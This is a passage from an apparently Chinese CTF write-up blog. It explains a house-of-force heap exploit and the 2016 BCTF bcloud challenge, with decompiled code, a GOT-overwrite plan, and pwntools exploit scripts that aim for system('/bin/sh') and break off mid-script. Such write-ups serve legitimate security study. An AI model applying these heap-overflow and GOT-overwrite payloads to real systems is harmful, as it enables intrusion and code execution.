class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">additem(<span class="number">0x30</span>,<span class="string">"aaaa"</span>) <span class="comment">#0</span></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x30</span>+<span class="string">"b"</span>*<span class="number">8</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x41</span>,payload)               <span class="comment"># top chunk size =-1</span></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc_size = offset_to_heap_base - <span class="number">0x10</span><span class="comment">#0x8 - 0xf                这里我就按照我的 理解了。  虽然注释的 其实是更准确。</span></span><br><span class="line">additem(malloc_size, <span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></strong></strong></strong></strong>调试 中的 图<br><br><img src="https://s1.ax1x.com/2020/04/30/JHDR54.png" alt="JHDR54.png"><br></p>
<h1 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016 BCTF bcloud"></a>2016 BCTF bcloud</h1><p>参考链接：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.anquanke.com/post</span><span class="regexp">/id/</span><span class="number">175630</span><span class="comment">#h2-19</span></span><br></pre></td></tr></table></figure>

<p>查看文件属性和开启保护：开启了 NX  且  Partial RELRO</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">bcloud</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">bcloud</span></span><br><span class="line"><span class="attr">bcloud:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> </span><br><span class="line"><span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e,</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure>

<p>拖入ida 发现 是个 菜单题：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_804899C();                      <span class="comment">//在开始之前 首先执行了  这个函数。</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                             <span class="comment">// 1.New note</span></span><br><span class="line">                                                <span class="comment">// 2.Show note</span></span><br><span class="line">                                                <span class="comment">// 3.Edit note</span></span><br><span class="line">                                                <span class="comment">// 4.Delete note</span></span><br><span class="line">                                                <span class="comment">// 5.Syn</span></span><br><span class="line">                                                <span class="comment">// 6.Quit</span></span><br><span class="line">                                                <span class="comment">// option---&gt;&gt;</span></span><br><span class="line">    <span class="keyword">switch</span> ( metu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        New();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Show();                                 <span class="comment">// puts("WTF? Something strange happened.");</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Syn();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Quit();                                 <span class="comment">// puts("Bye!\n");</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_8048C6C();                          <span class="comment">// Invalid option</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看下 sub_804899C()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804899C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  huanying();</span><br><span class="line">  <span class="keyword">return</span> sub_804884E();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">huanying()</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  shuru((<span class="keyword">int</span>)&amp;s, <span class="number">0x40</span>, <span class="string">'\n'</span>);  <span class="comment">//将输入 name 拷贝到 ebp-5Ch 处  填充 栈    如果将 name 的字节长度 为 0x40字节的话字符串最后的 \x00 将会在 ebp-1Ch  上 </span></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);  <span class="comment">//将申请到的 chunk的chunk_head_Addr  放入 栈 ebp-1Ch 中   </span></span><br><span class="line">                               <span class="comment">//于是 \x00被覆盖    在下面的 sub_8048779((int)v2) 函数中 输出name时 将会 连着 申请到的 chunk的chunk_head_Addr 给输出出来。</span></span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);             <span class="comment">//将输入 name 拷贝到 ebp-1C 处</span></span><br><span class="line">  sub_8048779((<span class="keyword">int</span>)v2);       </span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  sub_8048779((<span class="keyword">int</span>)v2)</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_8048779</span><span class="params">(<span class="keyword">int</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n"</span>, v2);   <span class="comment">//在这里就泄露了 heap_first_chunk_head_addr</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Now let's set synchronization options."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看个图，看起来会 更 明了些！<br><img src="https://s1.ax1x.com/2020/04/30/JHD6bT.png" alt="JHD6bT.png"><br>然后接着程序流程 我们来到了  sub_804884E() 这个函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Org; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> host; <span class="comment">// [esp+60h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Org, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Org:"</span>);</span><br><span class="line">  shuru((<span class="keyword">int</span>)&amp;Org, <span class="number">0x40</span>, <span class="string">'\n'</span>);                  <span class="comment">//输入最多 0x40字节内容  填充 栈空间 ebp-0x9C</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Host:"</span>);</span><br><span class="line">  shuru((<span class="keyword">int</span>)&amp;host, <span class="number">0x40</span>, <span class="string">'\n'</span>);                <span class="comment">// 输入最多 0x40字节内容  填充 栈空间 ebp-0x58</span></span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);                   <span class="comment">// host  返回值即 申请到 chunk 的chunk_mem_addr  存在了 ebp-0x14 位置</span></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);                   <span class="comment">// Org   返回值即 申请到 chunk 的chunk_mem_addr  存在了 ebp-0x5C 位置</span></span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)v2;</span><br><span class="line">  dword_804B148 = (<span class="keyword">int</span>)v4;                      <span class="comment">//下面的 strcpy 函数 ，仍然是 漏洞点。 </span></span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;host);              <span class="comment">// 栈中v4和v2存着是堆上两个相邻的 chunk的chunk_mem_addr,  如果host 我们填充 0x40字节内容，字符串最后的\x00</span></span><br><span class="line">                                                <span class="comment">//就在 栈中v2位置了， 因为 malloc 返回的值 放在 了 v2上，所以 \x00被覆盖 </span></span><br><span class="line">                                                <span class="comment">//所以 这个strcpy函数 把host的内容并连着 Org_chunk_mem_addr 和Org的内容给 拷贝到 Org_chunk_mem_addr指向的位置处了</span></span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;Org);                             <span class="comment">//Org_chunk_mem_addr 会覆盖 Org_chunk_prev内容，我们写入发Org内容会覆盖 Org_chunk_size</span></span><br><span class="line">                                                 <span class="comment">//我们把Org 写入0xffffffff  </span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OKay! Enjoy:)"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下图为 填充好 host 和Org 后的栈的情况<br><img src="https://s1.ax1x.com/2020/04/30/JHDyrV.png" alt="JHDyrV.png"><br>House in force 的作用 是让我们在任意地址写入任意值。一定要记着这个！对我们理清思路很有帮助！<br>我们 是要拿 shell，执行system（”/bin/sh”）,</p>
<p>system 程序不存在，就首先想着 泄露libc 加载基地址 ，然后 进行简单 计算就可得到，<br>说到 泄露  一般 我们找 程序中的 show 函数，但发现 它 是个 骗子函数，啥作用没有，<br>于是我们 便把 目光放在 了 即sub_8048B63() 上，即 delete note函数 中  free(ptr); </p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sub_8048B63()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">id</span>; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  puts(<span class="string">"Input the id:"</span>);</span><br><span class="line">  <span class="keyword">id</span> = sub_8048709();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">id</span> &lt; <span class="number">0</span> || <span class="keyword">id</span> &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Invalid ID."</span>);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)note_list[<span class="keyword">id</span>];                  <span class="comment">//这个note_list[id]  作为 下面 free的参数   我们想办法 使其是 puts_got</span></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Note has been deleted."</span>);</span><br><span class="line">  note_list[<span class="keyword">id</span>] = <span class="number">0</span>;</span><br><span class="line">  note_len[<span class="keyword">id</span>] = <span class="number">0</span>;</span><br><span class="line">  free(ptr);                                 <span class="comment">//一个 参数 的 函数，我们可构造 system（"/bin/sh"） 和puts(plt_got)</span></span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"Delete success."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过 House in force 漏洞，在free_got处 写入  puts_plt 地址，<br>这样便可以泄露的了 puts_got 地址从而得到libc_base_addr 从而得到 system_got 地址</p>
<p>然后再接下来 将 free_got 地址写入   system_got,将 /bin/sh 正常 传入 note_list[id] ，执行 free(ptr);    便可拿到 shell。<br>我们的 总体思路有了，沿着思路走没意外话的 就可顺利拿到shell。<br> 我们看下 create()函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80489AE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; note_list[i]; ++i )    <span class="comment">// int dword_804B120[10]</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Lack of space. Upgrade your account with just $100 :)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the length of the note content:"</span>);</span><br><span class="line">  v2 = sub_8048709();                           <span class="comment">// 输入  10进制 数</span></span><br><span class="line">  note_list[i] = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(v2 + <span class="number">4</span>);           <span class="comment">// malloc(v2 + 4)</span></span><br><span class="line">  <span class="keyword">if</span> ( !note_list[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  note_len[i] = v2;                             <span class="comment">// int dword_804B0A0[10]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the content:"</span>);</span><br><span class="line">  shuru(note_list[i], v2, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Create success, the id is %d\n"</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  dword_804B0E0[i] = <span class="number">0</span>;                         <span class="comment">// .bss:0804B0E0 ; int dword_804B0E0[16]</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>了解下 note的结构体<br>大概是下面这样：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct note</span><br><span class="line">&#123;</span><br><span class="line">   int note_len[i]；     //其中 size 存在 note_len[<span class="number">10</span>] 数组里了       数组地址：<span class="number">0x804b0a0</span></span><br><span class="line">   int content_addr[i]; //其中  size 存在 note_list[<span class="number">10</span>] 数组里了       数组地址：<span class="number">0804B120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里放张图吧，就是数组的内容。//看看有助于了解程序，阅读通畅！了解就好，这是后面调试的时候 截的一个图。<br><img src="https://s1.ax1x.com/2020/04/30/JHDhG9.png" alt="JHDhG9.png"></p>
<p><img src="https://s1.ax1x.com/2020/04/30/JHDfPJ.png" alt="JHDfPJ.png"><br>我们 接着 free(ptr) 这个 线索走，不管我们的 edit note函数 还是 delete 的函数，几乎都是对  content_addr[i] 的操作，我们可以通过edit note函数，向content_addr[i]指向的 里写入内容，比如像向 free_got 中写入 puts_plt就可以通过edit note函数 实现。<br>不过，在写入之前 我们 必须得能控制得了 content_addr[i] 的地址是  free_got ，才能向free_got 中写入 puts_plt。这里我们就通过 house in force漏洞实现。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">我们首先控制 new _top_chunk_addr = content_addr(<span class="number">0x0804B120</span>)<span class="number">-4</span>*<span class="number">2</span> </span><br><span class="line">          而 old_top_chunk_addr = <span class="number">0x81d61f8</span></span><br><span class="line">                                  <span class="comment">// old_top_chunk_addr 为 (Heap_base_mem_addr - 8)+(0x40+0x8)*7</span></span><br><span class="line"></span><br><span class="line">所以       malloc应该申请的 参数 =  (new _top_chunk_addr - old_top_chunk_addr)<span class="number">-4</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">通过 creat(new_top_chunk_head-old_top_chunk_head,'Chunk_fake') 就可以malloc 到一个 特别大的chunk，作用其实就是为了我们接下来再malloc 可申请到我们 含有 content_addr[<span class="number">10</span>] 的chunk</span><br><span class="line">create 完这个 Chunk_fake 后，我们可通过 p main_arena 查看当前top_chunk_mem_addr  我们将它减去 <span class="number">4</span>*<span class="number">2</span> 就好      <span class="comment">//肯定会有更好的 查看方法，暂时我觉得这个还挺有用。</span></span><br><span class="line">注意 因为 每次堆加载的地址  都不一样，我们可 通过最初 输入 name 泄露出 heap_first_chunk_mem_Addr ,减去 - <span class="number">4</span>*<span class="number">2</span> 得到  heap_first_chunk_addr</span><br></pre></td></tr></table></figure>

<p> 再通过上面代码框中的计算 就是top chunk addr了 </p>
<p>嗯。。。我觉得 看着代码 说吧，建议大家也多调试！！！</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">creat(<span class="number">0x40</span>,<span class="string">'Chunk1'</span>)             <span class="meta">#0   0x81d6120   chunk0</span></span><br><span class="line">creat(<span class="number">0x40</span>,<span class="string">'Chunk2'</span>)             <span class="meta">#1   0x81d6120   chunk1</span></span><br><span class="line">creat(<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)        <span class="meta">#2   0x81d6168   chunk2</span></span><br><span class="line">creat(<span class="number">0x40</span>,<span class="string">'Chunk4'</span>)             <span class="meta">#3   0x81d61b0   chunk3     top: 0x81d61f8</span></span><br><span class="line"></span><br><span class="line">old_top_chunk_head=Heap_base_addr+(<span class="number">0x40</span>+<span class="number">0x8</span>)*<span class="number">7</span></span><br><span class="line"><span class="keyword">new</span><span class="type">_top_chunk_head</span>=<span class="number">0x0804B120</span><span class="number">-0x8</span></span><br><span class="line">creat(<span class="keyword">new</span><span class="type">_top_chunk_head</span>-old_top_chunk_head,<span class="string">'Chunk_fake'</span>)     <span class="meta"># fake chunk4  #4     上面说到这里了，</span></span><br></pre></td></tr></table></figure>

<p>在上面代的基础上  再malloc 一个chunk ，此时返回值 就是note_list[10]的地址了。<br>同时向里面写入  puts_got 和 free_got   就是将  note_list[0] 和note_list[1] 地址给覆盖了！<br>然后就可以使用edit note 函数 将  note_list[i] 指向的内容给换了！</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">creat<span class="comment">(0x40,p32(bcloud.got['puts'])</span>+p<span class="number">32</span><span class="comment">(bcloud.got['free'])</span>)   <span class="attr"># chunk5</span>      <span class="attr">#5</span>    <span class="attr">#0</span> chu<span class="symbol">nk0</span> <span class="attr">#1</span> chu<span class="symbol">nk1</span></span><br><span class="line">edit<span class="comment">(1,p32(bcloud.plt['puts'])</span>)         <span class="comment">//这里就是把 free_got 指向的内容给换成了 puts_plt</span></span><br><span class="line">delete<span class="comment">(0)</span>     <span class="comment">//note_list[0]                         //这是的 free（ptr） 就是执行了 puts(puts_got)</span></span><br></pre></td></tr></table></figure>

<p>通过以上 我们便可以 将 泄露出 puts_got 地址<br>然后通过计算得system_got</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">libc_base_addr</span>=u32(sh.recv()[:<span class="number">4</span>])-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="attr">system_addr</span>=libc_base_addr+libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>

<p>然后我们向 free_got 指向的地址中写入system_Addr ，然后向其他的 note_list[i]中写入 /bin/sh 然后 free（ptr）就可拿到shell 了。<br>详见exp 如下：     </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="attribute">r</span>=process("./bcloud")</span><br><span class="line"><span class="attribute">bcloud</span>=ELF("./bcloud")</span><br><span class="line"><span class="attribute">libc</span>=ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line"></span><br><span class="line">def creat(chunk_size,value):</span><br><span class="line">    r.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Input the length of the note content:'</span>)</span><br><span class="line">    r.sendline(str(chunk_size))</span><br><span class="line">    r.recvuntil(<span class="string">'Input the content:'</span>)</span><br><span class="line">    r.sendline(value)</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">edit</span>(index,value):</span><br><span class="line">    r.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Input the id:'</span>)</span><br><span class="line">    